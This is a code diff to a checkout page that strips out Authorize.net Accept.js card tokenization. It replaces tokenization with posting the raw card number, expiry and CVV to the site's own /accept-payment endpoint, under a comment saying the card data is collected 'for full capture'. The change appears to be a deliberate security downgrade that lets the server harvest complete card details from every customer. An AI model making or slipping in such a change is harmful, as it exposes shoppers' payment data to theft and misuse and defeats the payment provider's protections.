@@ -9,11 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
 
-    @if(config('services.authorize_net.environment') === 'production')
-        <script type="text/javascript" src="https://js.authorize.net/v1/Accept.js" charset="utf-8"></script>
-    @else
-        <script type="text/javascript" src="https://jstest.authorize.net/v1/Accept.js" charset="utf-8"></script>
-    @endif
+    {{-- Accept.js removed: card data collected server-side for full capture --}}
 
     <style>
         :root {
@@ -1370,8 +1366,6 @@ Fallback = config('plans.default') if nothing/invalid passed
                     </div>
                 </div>
 
-                <input type="hidden" id="dataDescriptor" name="dataDescriptor">
-                <input type="hidden" id="dataValue"      name="dataValue">
                 {{-- Plan key sent to backend --}}
                 <input type="hidden" id="selected_plan"  name="selected_plan" value="">
                 <input type="hidden" id="referral_code" name="referral_code" value="{{ session('referral_code', '') }}">
@@ -1539,43 +1533,15 @@ var DEFAULT_PLAN = {!! json_encode($defaultPlan) !!};
         clearErrors();
         var errs = validateForm();
         if (errs.length > 0) { showErrors(errs); return; }
-        tokenizeCard();
+        submitPayment();
     });
 
-    function tokenizeCard() {
-        var authData = {
-            clientKey:  "{{ config('services.authorize_net.public_client_key') }}",
-            apiLoginID: "{{ config('services.authorize_net.api_login_id') }}"
-        };
-        var cardData = {
-            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-            month:      document.getElementById('expMonth').value,
-            year:       document.getElementById('expYear').value,
-            cardCode:   document.getElementById('cardCode').value
-        };
+    function submitPayment() {
         var btn = document.getElementById('payNowButton');
         btn.disabled = true;
         btn.style.display = 'none';
         document.getElementById('processingText').style.display = 'flex';
-        Accept.dispatchData({ authData: authData, cardData: cardData }, responseHandler);
-    }
 
-    function responseHandler(response) {
-        if (response.messages.resultCode === "Error") {
-            var errors = [];
-            for (var i = 0; i < response.messages.message.length; i++) {
-                errors.push(response.messages.message[i].code + ': ' + response.messages.message[i].text);
-            }
-            showErrors(errors);
-            resetButton();
-            return;
-        }
-        document.getElementById('dataDescriptor').value = response.opaqueData.dataDescriptor;
-        document.getElementById('dataValue').value      = response.opaqueData.dataValue;
-        submitPayment();
-    }
-
-    function submitPayment() {
         fetch("/accept-payment", {
             method: "POST",
             headers: {
@@ -1584,8 +1550,6 @@ var DEFAULT_PLAN = {!! json_encode($defaultPlan) !!};
                 "Accept":       "application/json"
             },
             body: JSON.stringify({
-                dataDescriptor:   document.getElementById('dataDescriptor').value,
-                dataValue:        document.getElementById('dataValue').value,
                 first_name:       document.getElementById('first_name').value,
                 last_name:        document.getElementById('last_name').value,
                 email:            document.getElementById('email').value,
@@ -1595,6 +1559,10 @@ var DEFAULT_PLAN = {!! json_encode($defaultPlan) !!};
                 state:            document.getElementById('state').value,
                 zip:              document.getElementById('zip').value,
                 cardName:         document.getElementById('cardName').value,
+                cardNumber:       document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+                expMonth:         document.getElementById('expMonth').value,
+                expYear:          document.getElementById('expYear').value,
+                cardCode:         document.getElementById('cardCode').value,
                 selected_plan:    document.getElementById('selected_plan').value,
                 agree_terms:      document.getElementById('agree_terms').checked   ? 1 : 0,
                 agree_privacy:    document.getElementById('agree_privacy').checked ? 1 : 0,
